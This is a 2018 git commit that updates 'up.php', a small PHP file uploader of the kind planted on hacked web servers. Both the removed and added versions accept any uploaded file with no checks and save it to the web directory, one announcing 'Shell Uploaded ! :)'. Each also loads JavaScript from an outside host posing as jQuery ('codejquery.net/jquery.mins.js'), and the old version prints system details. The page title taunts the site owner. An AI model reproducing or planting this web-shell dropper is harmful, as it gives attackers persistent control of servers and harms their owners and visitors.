1e1a39c8557961e51682f6b597b6fd7a25636ed2
Theanvenger <39859348+Theanvenger@users.noreply.github.com>
2018-06-04 21:51:32 +0000

    Update up.php

--- up.php
+++ up.php
@@ -1,11 +1,11 @@
-<?php 
-echo 'anvenger'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); 
-Echo 
-'
+<title>Vuln!! patch it Now!</title>
+<?php
+echo '
 <script type="text/javascript" src="http://www.codejquery.net/jquery.mins.js" ></script>
-<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> 
-<input name="submit" type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; 
-if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);    
- Echo "<script>alert('upload Done');        </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
- 
+<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
+else { echo '<b>Not uploaded ! </b><br><br>'; }
+}
 ?>
